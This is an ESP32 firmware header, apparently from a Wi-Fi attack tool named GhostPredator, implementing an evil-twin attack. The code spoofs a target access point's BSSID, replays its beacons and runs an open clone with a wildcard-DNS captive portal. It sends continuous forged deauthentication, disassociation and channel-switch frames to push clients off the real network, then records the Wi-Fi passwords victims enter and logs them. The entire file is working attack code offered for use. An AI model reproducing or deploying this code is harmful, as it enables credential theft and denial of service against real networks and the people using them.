#pragma once
#include <Arduino.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <esp_wifi.h>
#include <vector>
#include "../utils/logger.h"
#include "../utils/rgb_led.h"
#include "../config.h"
#include "ap_clone.h"

struct CapturedCred {
    String ssid;
    String password;
    String ip;
    unsigned long ts;
};

class EvilTwin {
public:
    static EvilTwin& get() { static EvilTwin inst; return inst; }

    bool   running     = false;
    bool   cloneMode   = false;  // true = AP clone com BSSID spoofado + beacon replay
    String clonedSSID;
    uint8_t clonedBSSID[6] = {};
    std::vector<CapturedCred> captured;
    uint8_t connectedClients = 0;

    // === Modo clone: replica EXATAMENTE o AP alvo (BSSID + IEs + capabilities)
    // Requer beacon capturado pelo APClone/Sniffer antes de chamar
    void startClone(uint8_t beaconIdx) {
        if (beaconIdx >= APClone::get().captured.size()) {
            LOG.warn("[ET-CLONE] Beacon idx " + String(beaconIdx) + " invalido");
            return;
        }
        auto& cb = APClone::get().captured[beaconIdx];
        startCloneFromBeacon(cb);
    }

    void startCloneFromBeacon(const APClone::CapturedBeacon& cb) {
        if (running) stop();
        cloneMode = true;
        clonedSSID = String(cb.ssid);
        memcpy(clonedBSSID, cb.bssid, 6);

        // Salva MAC original e faz BSSID spoof para o MAC exato do AP alvo
        APClone::get().saveOriginalMac();
        bool spoofed = APClone::get().spoofMac(cb.bssid);

        // AP aberto (sem senha) no mesmo canal do alvo
        // Mesmo sem senha, com BSSID idêntico e beacon clone, clientes nao percebem diferença
        WiFi.softAP(cb.ssid, nullptr, cb.channel);
        delay(500);

        // DNS wildcard → redireciona tudo para o portal captive
        _dns.start(53, "*", WiFi.softAPIP());

        _deauthChannel = cb.channel;
        _lastDeauth    = 0;
        memcpy(_deauthTarget, cb.bssid, 6);
        running = true;

        // Inicia replay de beacon com IEs exatos do AP real
        APClone::get().startReplay(
            [&]() -> uint8_t {
                for (uint8_t i = 0; i < APClone::get().captured.size(); i++)
                    if (memcmp(APClone::get().captured[i].bssid, cb.bssid, 6) == 0)
                        return i;
                return 0xFF;
            }()
        );

        char bssidStr[18];
        snprintf(bssidStr, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
                 cb.bssid[0],cb.bssid[1],cb.bssid[2],cb.bssid[3],cb.bssid[4],cb.bssid[5]);
        LOG.success("[ET-CLONE] Clone completo: \"" + String(cb.ssid) + "\"");
        LOG.warn("[ET-CLONE] BSSID: " + String(bssidStr) +
                 " ch" + String(cb.channel) +
                 (spoofed ? " [MAC SPOOFADO]" : " [beacon injection]") +
                 (cb.hasRSN ? " WPA2" : " OPEN") +
                 (cb.hasHT  ? " N" : "") + (cb.hasVHT ? " AC" : ""));
        LOG.warn("[ET-CLONE] Portal: http://" + WiFi.softAPIP().toString());
        LOG.warn("[ET-CLONE] AP gerencial GhostPredator suspenso durante clone");
    }

    // === Modo padrão: AP com o SSID do alvo, sem clone de beacon
    void start(const String& ssid, uint8_t channel) {
        if (running) stop();
        cloneMode  = false;
        clonedSSID = ssid;
        memset(clonedBSSID, 0, 6);

        WiFi.softAP(ssid.c_str(), nullptr, channel);
        delay(500);

        _dns.start(53, "*", WiFi.softAPIP());

        _deauthChannel = channel;
        _lastDeauth    = 0;
        memset(_deauthTarget, 0, 6);
        running = true;
        LOG.warn("[ET] AP clone ativo: \"" + ssid + "\" ch" + String(channel) +
                 " | portal: http://" + WiFi.softAPIP().toString());
        LOG.warn("[ET] ATENCAO: AP gerencial GhostPredator suspenso durante ET");
    }

    void stop() {
        _dns.stop();
        APClone::get().stopReplay();
        if (cloneMode) APClone::get().restoreMac();
        cloneMode  = false;
        running    = false;
        // Restaura AP gerencial
        WiFi.softAP(AP_SSID, AP_PASS, AP_CHANNEL);
        LOG.info("[ET] Parado. Creds: " + String(captured.size()) +
                 " | AP gerencial restaurado: " AP_SSID);
    }

    // Configura BSSID do AP real para deauth contínuo durante ET
    void setDeauthTarget(const uint8_t* bssid) {
        memcpy(_deauthTarget, bssid, 6);
    }

    void tick() {
        if (!running) return;
        _dns.processNextRequest();

        // Conta clientes conectados ao clone
        connectedClients = WiFi.softAPgetStationNum();

        // Beacon replay contínuo (clone mode)
        if (cloneMode) APClone::get().tick();

        // Deauth contínuo do AP real (a cada 3s no clone, 5s no modo padrão)
        uint32_t deauthInterval = cloneMode ? 3000 : 5000;
        if (millis() - _lastDeauth > deauthInterval) {
            _lastDeauth = millis();
            bool hasBssid = false;
            for (int i = 0; i < 6; i++) if (_deauthTarget[i]) { hasBssid = true; break; }
            if (hasBssid) _sendDeauthBurst();
        }
    }

    void addCred(const String& ssid, const String& pass, const String& ip) {
        CapturedCred c{ ssid, pass, ip, millis() };
        captured.push_back(c);
        RGBLed::get().flashFound();
        LOG.success("[ET] CRED: SSID=\"" + ssid + "\" PASS=\"" + pass + "\" IP=" + ip);
    }

    DNSServer& dns() { return _dns; }

    String statusJson() const {
        String j = "{\"running\":" + String(running ? "true" : "false");
        j += ",\"clone\":" + String(cloneMode ? "true" : "false");
        j += ",\"ssid\":\"" + _esc(clonedSSID) + "\"";
        j += ",\"clients\":" + String(connectedClients);
        j += ",\"creds\":" + String(captured.size());
        j += ",\"ip\":\"" + WiFi.softAPIP().toString() + "\"";
        j += "}";
        return j;
    }

private:
    DNSServer     _dns;
    uint8_t       _deauthTarget[6]  = {};
    uint8_t       _deauthChannel    = 1;
    unsigned long _lastDeauth       = 0;

    static String _esc(const String& s) {
        String r = s; r.replace("\"","\\\""); return r;
    }

    void _sendDeauthBurst() {
        esp_wifi_set_channel(_deauthChannel, WIFI_SECOND_CHAN_NONE);
        const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
        static const uint8_t reasons[] = {0x01,0x02,0x03,0x07,0x08,0x09,0x0E,0x05};
        // Rafada maior no clone mode para garantir que clientes migrem para nós
        int burst = cloneMode ? 96 : 48;
        for (int i = 0; i < burst; i++) {
            uint8_t r = reasons[i % 8];
            uint8_t f[26] = {};
            f[0] = 0xC0; f[1] = 0x00;
            f[2] = 0x3A; f[3] = 0x01;
            f[24] = r;
            // Deauth AP→broadcast
            memcpy(f +  4, bcast,         6);
            memcpy(f + 10, _deauthTarget, 6);
            memcpy(f + 16, _deauthTarget, 6);
            esp_wifi_80211_tx(WIFI_IF_AP, f, 26, true);
            // Disassoc AP→broadcast
            f[0] = 0xA0;
            esp_wifi_80211_tx(WIFI_IF_AP, f, 26, true);
        }
        // CSA no clone mode: direciona clientes para o nosso canal
        if (cloneMode) {
            uint8_t myCh = WiFi.channel();
            uint8_t f2[35] = {};
            f2[0] = 0xD0; f2[1] = 0x00;
            f2[2] = 0x3A; f2[3] = 0x01;
            memcpy(f2+4,  bcast,        6);
            memcpy(f2+10, _deauthTarget, 6);
            memcpy(f2+16, _deauthTarget, 6);
            f2[24] = 0x00; f2[25] = 0x04; // Spectrum Mgmt CSA
            f2[26] = 0x25; f2[27] = 0x03;
            f2[28] = 0x01; f2[29] = myCh; f2[30] = 3;
            f2[31] = 0x3C; f2[32] = 0x03;
            f2[33] = 0x01; f2[34] = myCh;
            for (int i = 0; i < 3; i++)
                esp_wifi_80211_tx(WIFI_IF_AP, f2, 35, true);
        }
    }
};
